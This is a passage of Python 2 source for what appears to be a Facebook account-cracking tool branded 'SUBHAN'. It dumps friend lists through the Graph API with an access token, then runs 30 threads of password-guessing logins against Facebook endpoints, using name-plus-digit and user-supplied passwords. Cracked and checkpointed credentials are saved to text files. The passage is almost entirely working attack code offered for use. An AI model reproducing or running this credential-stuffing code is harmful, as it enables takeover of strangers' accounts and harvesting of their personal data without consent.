                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('SUBHAN-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;91m"
    print 39*'-'
    print "[!] cloning complete result ........"
    print 39*'-'
    print '[!] total ok ids : '+str(len(oks))
    print '[!] total cp ids : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
            
        








        



























def n_p_pass():
    id1="4"
    id2="4"
    id3="4"
    id4="4"
    id5="4"
    token=open('token.txt','r').read()
    os.system('clear')
    print logo
    print ""
    print " [ Maximum Limit 5 ]"
    print ""
    ty=raw_input('[!] How Many Pass Do You Want To Add : ')
    if ty=="1":
        print ""
        ps1=raw_input("[1] Enter digit : ")
        pass
    elif ty=="2":
        ps1=raw_input("[1] Enter digit : ")
        ps2=raw_input("[2] Enter digit : ")
        pass
    elif ty=="3":
        ps1=raw_input("[1] Enter digit : ")
        ps2=raw_input("[2] Enter digit : ")
        ps3=raw_input("[3] Enter digit : ")
        pass
    elif ty=="4":
        ps1=raw_input("[1] Enter digit : ")
        ps2=raw_input("[2] Enter digit : ")
        ps3=raw_input("[3] Enter digit : ")
        ps4=raw_input("[4] Enter digit : ")
        pass
    elif ty=="5":
        ps1=raw_input("[1] Enter digit : ")
        ps2=raw_input("[2] Enter digit : ")
        ps3=raw_input("[3] Enter digit : ")
        ps4=raw_input("[4] Enter digit : ")
        ps5=raw_input("[5] Enter digit : ")
    
  
    print ""
    print " [ Maximum Limit 5 ]"
    print ""
    ty=raw_input('[!] How Many Links Do You Want To Clone: ')
    print ""
    if ty=="1":
        print ""
        idt=raw_input("[1] Enter ID : ")
        pass
    elif ty=="2":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        pass
    elif ty=="3":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        id3=raw_input("[3] Enter ID : ")
        pass
    elif ty=="4":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        id3=raw_input("[3] Enter ID : ")
        id4=raw_input("[4] Enter ID : ")
        pass
    elif ty=="5":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        id3=raw_input("[3] Enter ID : ")
        id4=raw_input("[4] Enter ID : ")
        id5=raw_input("[5] Enter ID : ")
    else:
        print ("invlid option")
        time.sleep(2)
        fb_menu()
    
    
    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r2 = requests.get('https://graph.facebook.com/' + id2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r3 = requests.get('https://graph.facebook.com/' + id3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r4 = requests.get('https://graph.facebook.com/' + id4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r5 = requests.get('https://graph.facebook.com/' + id5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
        
         
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;91m Cracking Start Please Wait .. "
    print "\033[1;91m Agar Idz Nhi Aa Rahe To (Airplane) Flight Mod Use Kro"
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        try:
            first = name.rsplit(' ')[0]
            last = name.rsplit(' ')[1]
            
            pass1 = name
            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
            q = json.loads(data)
            if "access_token" in q:
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
                
            else:
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2= first+ps1
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                    q = json.loads(data)
                    if "access_token" in q:
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                            cp=open('SUBHAN-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3=  first+ps2
                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                            q = json.loads(data)
                            if "access_token" in q:
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('SUBHAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if "www.facebook.com" in q ["error_msg"]:
                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4= first+ps3
                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if "www.facebook.com" in q ["error_msg"]:
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('SUBHAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5= last+ps4
                                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                            q = json.loads(data)
                                            if "access_token" in q:
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('SUBHAN-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if "www.facebook.com" in q ["error_msg"]:
                                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] cloning complete result ........"
    print 39*'-'
    print '[!] total ok ids : '+str(len(oks))
    print '[!] total cp ids : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()


def n_p_pass():
    id2="4"
    id3="4"
    id4="4"
    id5="4"
    token=open('token.txt','r').read()
    os.system('clear')
    print logo
    print ""
    ps1=raw_input('[1] name + digit : ')
    ps2=raw_input('[2] name + digit : ')
    ps3=raw_input('[4] name + digit : ')
    ps4=raw_input('[4] Last + Name  : ')



def p_p_pass():
    id2="4"
    id3="4"
    id4="4"
    id5="4"
    token=open('token.txt','r').read()
    os.system('clear')
    print logo
    print ""
    print " [ Maximum Limit 5 ]"
    print ""
    ty=raw_input('[!] How Many Pass Do You Want To Add: ')
    print ""
    if ty=="1":
        print ""
        ps1=raw_input("[1] Enter Pass : ")
        pass
    elif ty=="2":
        ps1=raw_input("[1] Enter Pass : ")
        ps1=raw_input("[2] Enter Pass : ")
        pass
    elif ty=="3":
        ps1=raw_input("[1] Enter Pass : ")
        ps1=raw_input("[2] Enter Pass : ")
        ps1=raw_input("[3] Enter Pass : ")
        pass
    elif ty=="4":
        ps1=raw_input("[1] Enter Pass : ")
        ps1=raw_input("[2] Enter Pass : ")
        ps1=raw_input("[3] Enter Pass : ")
        ps1=raw_input("[4] Enter Pass : ")
        pass
    elif ty=="5":
        ps1=raw_input("[1] Enter Pass : ")
        ps1=raw_input("[2] Enter Pass : ")
        ps1=raw_input("[3] Enter Pass : ")
        ps1=raw_input("[4] Enter Pass : ")
        ps1=raw_input("[5] Enter Pass : ")
    print ""
    print " [ Maximum Limit5 ]"
    
    print ""
    ty=raw_input('[!] How Many Links Do You Want To Clone : ')
    print ""
    if ty=="1":
        print ""
        idt=raw_input("[1] Enter ID : ")
        pass
    elif ty=="2":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        pass
    elif ty=="3":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        id3=raw_input("[3] Enter ID : ")
        pass
    elif ty=="4":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        id3=raw_input("[3] Enter ID : ")
        id4=raw_input("[4] Enter ID : ")
        pass
    elif ty=="5":
        idt=raw_input("[1] Enter ID : ")
        id2=raw_input("[2] Enter ID : ")
        id3=raw_input("[3] Enter ID : ")
        id4=raw_input("[4] Enter ID : ")
        id5=raw_input("[5] Enter ID : ")
    else:
        print ("invlid option")
        time.sleep(2)
        fb_menu()
    
    
    
    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r2 = requests.get('https://graph.facebook.com/' + id2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r3 = requests.get('https://graph.facebook.com/' + id3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r4 = requests.get('https://graph.facebook.com/' + id4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r5 = requests.get('https://graph.facebook.com/' + id5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;91m   Cracking Start Please Wait .."
    print "\033[1;91m   Use Flight Mode For Speed Up"
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        try:
            pass1 = ps1
            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
            q = json.loads(data)
            if "access_token" in q:
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
                
            else:
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-ok.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2=ps2
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                    q = json.loads(data)
                    if "access_token" in q:
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;91m[SUBHAN-OK] "+uid + " | " + pass2
                            cp=open('SUBHAN-ok.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3=ps3
                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                            q = json.loads(data)
                            if "access_token" in q:
                                print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass3
                                ok=open('SUBHAN-cp.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if "www.facebook.com" in q ["error_msg"]:
                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4=ps4
                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if "www.facebook.com" in q ["error_msg"]:
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('SUBHAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] Cloning Complete Result ........"
    print 39*'-'
    print '[!] Total Ok Ids: '+str(len(oks))
    print '[!] Total Cp Ids : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press Enter To Back')
    fb_menu()


def grap():
        os.system('clear')
        print logo
        print ""
        print ""
        print "\t     [ File Making ]"
        print ""
        print "\t  [ Maximum Limit 10 IDs ]"
        print ""
        c=raw_input("[!] How Many Links Do You Want To Dump : ")
        if c=='1':
            ext1()
        elif c=='2':
            ext2()
        elif c=='3':
            ext3()
        elif c=='4':
            ext4()
        elif c=='5':
            ext5()
        elif c=='6':
            ext6()
        elif c=='7':
            ext7()
        elif c=='8':
            ext8()
        elif c=='9':
            ext9()
        elif c=='10':
            ext10()
          
        else:
            main_system()
         
        main_system()


def mineExt():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        main_system()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[*] Enter ID : ")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[*] Extracting From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print gu+"[*] Graping URLs ......"+w
    print ""
    time.sleep(2)
    print g+"[*] Graping Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "100077" >> kk.txt')
    os.system(' cat look.txt | grep "100078" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From IMTIAZ : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print ""
    print sm+"[*] Total Extract ids : "+str(len(count))+w
    print ""
    mvt=raw_input("[=] Enter Path To Save File : ")
    print "[*] Your File Save in : "+mvt
    shutil.move(hok,mvt)
    os.system('rm -rf jok.txt')
    raw_input('[=] Press Enter To Back')
    main_system()



file="file.txt"

def ext1():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
        
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
        
    fuck.close()
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print (' [*] Your File Save In : '+cop)
    raw_input('[!] Press Enter To Back')
    main_system()

def ext2():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
        
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()

def ext3():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
        
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()

def ext4():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
    d4=raw_input('[4] Enter ID : ')
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
